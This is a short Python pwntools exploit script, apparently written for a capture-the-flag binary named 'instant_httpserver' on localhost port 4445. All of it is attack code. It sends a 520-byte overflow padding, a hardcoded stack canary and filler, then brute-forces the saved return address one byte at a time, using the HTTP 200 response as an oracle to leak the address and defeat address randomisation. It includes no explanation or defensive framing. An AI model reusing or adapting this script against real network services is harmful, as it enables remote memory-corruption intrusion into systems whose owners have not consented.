from pwn import *
from sys import argv
from time import sleep

context.log_level = "debug"

binfile = "./instant_httpserver"

elf = ELF(binfile)

p = remote("localhost", 4445)

ret_addr = b"\xda"
for i in range(0, 5):
    for j in range(0, 256):
        p = remote("localhost", 4445)
        #pause()
        log.info("ret_addr: "+str(ret_addr))
        log.info("val: "+str(j.to_bytes(1, "little")))
        payload = b""
        payload += b"A" * 520
        payload += p64(0xd9aa09a1d5af7f00)
        payload += b"BBBBBBBB"
        payload += ret_addr
        payload += j.to_bytes(1, "little")
        p.send(payload)
        p.recv()
        p.send("GET")
        buf = p.recv(timeout=0.1)
        p.close()
        if b"HTTP/1.1 200 OK\r\n" in buf:
            ret_addr += j.to_bytes(1, "little")
            break

ret_addr = u64(ret_addr.ljust(8, b"\x00"))
log.info("leak addr: 0x{:08x}".format(ret_addr))

